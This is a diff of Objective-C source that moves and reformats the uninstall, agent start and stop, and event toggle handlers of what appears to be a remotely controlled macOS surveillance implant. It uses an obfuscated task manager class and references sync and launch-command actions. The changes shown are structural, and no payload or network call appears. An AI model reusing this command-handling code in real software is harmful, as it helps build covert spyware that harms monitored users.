@@ -43,6 +43,70 @@
   [super dealloc];
 }
 
+// Done.
+- (BOOL)actionUninstall: (NSMutableDictionary *)aConfiguration
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
+  
+  [aConfiguration retain];
+  
+  [taskManager uninstallMeh];
+  
+  NSNumber *status = [NSNumber numberWithInt: 0];
+  [aConfiguration setObject: status forKey: @"status"];
+  
+  [aConfiguration release];
+  
+  [pool release];
+  
+  return TRUE;
+}
+
+- (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag
+{
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
+  
+  [aConfiguration retain];
+  
+  //NSNumber *status;
+  NSNumber *status = [NSNumber numberWithInt: 0];
+  //status = [aConfiguration objectForKey: @"status"];
+  
+  //
+  // Start/Stop Agent actions got the agentID inside the additional Data
+  //
+  u_int agentID = 0;
+  [[aConfiguration objectForKey: @"data"] getBytes: &agentID];
+  
+  BOOL success;
+  
+  if (aFlag == TRUE)
+  {
+    success = [taskManager startAgent: agentID];
+  }
+  else
+  {
+    success = [taskManager stopAgent: agentID];
+  }
+  
+  if (success)
+  {
+    [aConfiguration setObject: status
+                       forKey: @"status"];
+  }
+  else
+  {
+#ifdef DEBUG_ACTIONS
+    errorLog(@"An error occurred while %@ the agent", (aFlag) ? @"Starting" : @"Stopping");
+#endif
+  }
+  
+  [aConfiguration release];
+  
+  return TRUE;
+}
+
 - (BOOL)actionSync: (NSMutableDictionary *)aConfiguration
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -248,50 +312,6 @@
   return bSuccess;
 }
 
-- (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag
-{
-  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
-  
-  [aConfiguration retain];
-  
-  //NSNumber *status;
-  NSNumber *status = [NSNumber numberWithInt: 0];
-  //status = [aConfiguration objectForKey: @"status"];
-  
-  //
-  // Start/Stop Agent actions got the agentID inside the additional Data
-  //
-  u_int agentID = 0;
-  [[aConfiguration objectForKey: @"data"] getBytes: &agentID];
-  
-  BOOL success;
-  
-  if (aFlag == TRUE)
-    {
-      success = [taskManager startAgent: agentID];
-    }
-  else
-    {
-      success = [taskManager stopAgent: agentID];
-    }
-  
-  if (success)
-    {
-      [aConfiguration setObject: status
-                         forKey: @"status"];
-    }
-  else
-    {
-#ifdef DEBUG_ACTIONS
-      errorLog(@"An error occurred while %@ the agent", (aFlag) ? @"Starting" : @"Stopping");
-#endif
-    }
-  
-  [aConfiguration release];
-  
-  return TRUE;
-}
-
 // Done. XXX- fix waituntilExit for task
 - (BOOL)actionLaunchCommand: (NSMutableDictionary *)aConfiguration
 {
@@ -337,18 +357,45 @@
   return TRUE;
 }
 
-// Done.
-- (BOOL)actionUninstall: (NSMutableDictionary *)aConfiguration
+typedef struct {
+  UInt32 enabled;
+  UInt32 event;
+} action_event_t;
+
+// FIXED-
+- (BOOL)actionEvent: (NSMutableDictionary *)aConfiguration
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
+  
+  NSNumber *newStatus;
+  action_event_t *event;
   
   [aConfiguration retain];
   
-  [taskManager uninstallMeh];
+  event = (action_event_t*)[[aConfiguration objectForKey: @"data"] bytes];
   
-  NSNumber *status = [NSNumber numberWithInt: 0];
-  [aConfiguration setObject: status forKey: @"status"];
+  if (event != nil)
+  {
+    NSMutableDictionary *anEvent = 
+    [[[__m_MTaskManager sharedInstance] mEventsList] objectAtIndex: event->event];
+    
+    @synchronized(anEvent)
+    {  
+      NSNumber *enabled = [anEvent objectForKey: @"enabled"];
+      
+      if (enabled != nil)
+      {
+        if (event->enabled == TRUE) 
+        {
+          newStatus = [NSNumber numberWithInt: 1];
+        }
+        else
+          newStatus = [NSNumber numberWithInt: 0];
+        
+        [anEvent setObject: newStatus forKey: @"enabled"];
+      }
+    }
+  }
   
   [aConfiguration release];
   
@@ -377,53 +424,6 @@
   [infoManager release];
   [aConfiguration release];
 
-  [pool release];
-  
-  return TRUE;
-}
-
-typedef struct {
-  UInt32 enabled;
-  UInt32 event;
-} action_event_t;
-
-// FIXED-
-- (BOOL)actionEvent: (NSMutableDictionary *)aConfiguration
-{
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
-  NSNumber *newStatus;
-  action_event_t *event;
-  
-  [aConfiguration retain];
-  
-  event = (action_event_t*)[[aConfiguration objectForKey: @"data"] bytes];
-  
-  if (event != nil)
-    {
-      NSMutableDictionary *anEvent = 
-                          [[[__m_MTaskManager sharedInstance] mEventsList] objectAtIndex: event->event];
-      
-      @synchronized(anEvent)
-      {  
-        NSNumber *enabled = [anEvent objectForKey: @"enabled"];
-        
-        if (enabled != nil)
-          {
-            if (event->enabled == TRUE) 
-              {
-                newStatus = [NSNumber numberWithInt: 1];
-              }
-            else
-              newStatus = [NSNumber numberWithInt: 0];
-            
-            [anEvent setObject: newStatus forKey: @"enabled"];
-          }
-        }
-    }
-    
-  [aConfiguration release];
-  
   [pool release];
   
   return TRUE;
